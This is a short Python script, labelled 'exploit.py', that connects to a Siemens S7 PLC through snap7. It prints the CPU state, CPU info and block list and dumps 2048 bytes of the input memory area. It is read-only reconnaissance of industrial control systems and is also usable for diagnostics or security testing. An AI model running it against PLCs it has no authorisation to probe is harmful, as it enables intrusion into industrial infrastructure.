import snap7.client as s7
import numpy as np
import sys
import os

## === Lectura con Snap7 para Siemens7 PLC ===
# Autor: Alejandro Manuel Lopez Gomez

# Parametros de entrada:
#   - Dirección IP del PLC

# Este programa permite leer la memoria en bytes de 
# la Unidad de Procesamiento de Entrada o IPU

if len(sys.argv) != 2: 
    print("Usage: exploit.py <ip>")
    sys.exit(0)

plc = s7.Client()
plc.connect(str(sys.argv[1]),0,0)

print("[!] Checking connectivity...")
if plc.get_connected():
    print("[OK] PLC is UP!")
    print(f"[!] CPU State: {plc.get_cpu_state()}")
    print(f"[!] CPU Info: {plc.get_cpu_info()}")
    print(f"[!] Blocks available: {plc.list_blocks()}")
    print("\n[!] PLC IPU area data:")
    print(plc.ab_read(0,2048))
else:
    print("[ERROR] PLC is DOWN!")

plc.disconnect()